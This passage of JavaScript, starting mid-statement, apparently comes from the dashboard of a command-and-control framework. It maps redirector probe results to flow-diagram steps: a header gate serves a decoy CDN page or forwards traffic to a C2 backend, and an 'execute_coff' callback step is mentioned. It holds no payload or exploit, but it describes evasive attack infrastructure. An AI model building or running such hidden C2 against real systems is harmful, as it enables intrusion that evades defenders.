      file.name + '"} on a callback, then execute_coff.';
  } catch (err) {
    status.textContent = 'Local only (' + file.name + '): ' + err.message;
  }
}

/* --------------------------------------------------------------------------
   Real redirector probe -> flow-diagram steps.

   The redirector visualizer used to render a hardcoded narrative: whatever you
   clicked, it drew "header verified -> forwarded to backend" and invented a
   200 response. Now that /api/ops/probe performs a real request, the diagram is
   derived from the actual result, so a route whose backend is down shows as
   down.
   -------------------------------------------------------------------------- */
function opsProbeToTrace(p) {
  const trace = [{
    step: 1,
    title: 'Request reaches the redirector',
    node: 'Apache Listener :80',
    detail: 'POST ' + (p.url || '') + ' with the supplied headers.',
    status: 'shield_divert',
  }];

  if (!p.ok) {
    trace.push({
      step: 2, title: 'Redirector unreachable', node: 'Apache Listener :80',
      detail: p.error || 'no response',
      status: 'shield_divert',
    });
    return { trace: trace, probe: p };
  }

  if (p.verdict === 'decoy') {
    trace.push({
      step: 2, title: 'Header gate rejected the request', node: 'Rewrite Rule',
      detail: 'The gate header was missing or wrong, so the request never reached a C2 backend.',
      status: 'shield_divert',
    });
    trace.push({
      step: 3, title: 'Serve Decoy CDN Content', node: 'CloudEdge CDN Engine',
      detail: 'Returned the benign decoy page (' + p.bytes + ' bytes).',
      status: 'decoy_served',
    });
  } else if (p.verdict === 'backend_down') {
    trace.push({
      step: 2, title: 'Header gate passed, backend refused', node: 'mod_proxy',
      detail: 'Apache matched the route but got HTTP ' + p.status +
              ' from the backend: the route is wired but nothing is listening.',
      status: 'shield_divert',
    });
  } else {
    trace.push({
      step: 2, title: 'Header gate verified', node: 'Rewrite Rule',
      detail: 'Gate header matched; the request was proxied onward.',
      status: 'header_verified',
    });
    trace.push({
      step: 3, title: 'Forwarded to C2 backend', node: 'c2_core',
      detail: 'Real response: HTTP ' + p.status + ', ' + p.bytes + ' bytes, ' +
              (p.content_type || 'no content-type'),
      status: 'c2_forwarded',
    });
  }
  return { trace: trace, probe: p };
}
